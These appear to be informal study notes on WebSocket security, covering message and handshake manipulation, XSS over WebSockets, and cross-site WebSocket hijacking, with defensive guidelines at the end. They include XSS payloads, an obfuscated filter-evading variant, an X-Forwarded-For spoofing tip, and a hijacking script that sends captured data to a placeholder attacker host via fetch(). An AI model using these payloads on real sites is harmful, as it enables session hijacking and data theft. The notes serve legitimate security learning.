 WebSockets are widely used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.

WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications. 



Manipulating WebSocket traffic

Finding WebSockets security vulnerabilities generally involves manipulating them in ways that the application doesn't expect. You can do this using Burp Suite.

You can use Burp Suite to:

    Intercept and modify WebSocket messages.
    Replay and generate new WebSocket messages.
    Manipulate WebSocket connections.




Manipulating WebSocket connections
=
As well as manipulating WebSocket messages, it is sometimes necessary to manipulate the WebSocket handshake that establishes the connection.

There are various situations in which manipulating the WebSocket handshake might be necessary:

    It can enable you to reach more attack surface.
    Some attacks might cause your connection to drop so you need to establish a new one.
    Tokens or other data in the original handshake request might be stale and need updating.




web socket vulnerabilities
=
user-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as 1.SQL injection or XML external entity injection.
2.Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.
3.If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities. 


for example 
message sent {"message":"hello matt"}

delivers like this on the other user browser
"<t/d> hello matt <td/>"

provided not defenses are in play attacker can leverage XSS

{"message":"</img src=1 onerror='alert(1)'>"}

vuln that arises from manipulating handshakes 
=

    Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header.
    Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
    Attack surface introduced by custom HTTP headers used by the application.

note #
spoofing the ip address with the x forwarded for header 
with an obufscated payload does the trick 
e.g <img src=1 oNeRrOr=alert`1`>



Using cross-site WebSockets to exploit vulnerabilities
==

Some WebSockets security vulnerabilities arise when an attacker makes a cross-domain WebSocket connection from a web site that the attacker controls. This is known as a cross-site WebSocket hijacking attack, and it involves exploiting a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. The attack often has a serious impact, allowing an attacker to perform privileged actions on behalf of the victim user or capture sensitive data to which the victim user has access. 


what!!!
==
???
Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values. 



If the WebSocket handshake is not correctly protected using a CSRF token or a nonce, it's possible to use the authenticated WebSocket of a user on an attacker's controlled site because the cookies are automatically sent by the browser. This attack is called Cross-Site WebSocket Hijacking (CSWSH).

Example exploit, hosted on an attacker's server, that exfiltrates the received data from the WebSocket to the attacker:



<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>






How to secure a WebSocket connection
==
To minimize the risk of security vulnerabilities arising with WebSockets, use the following guidelines:

    Use the wss:// protocol (WebSockets over TLS).
    Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
    Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
    Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.

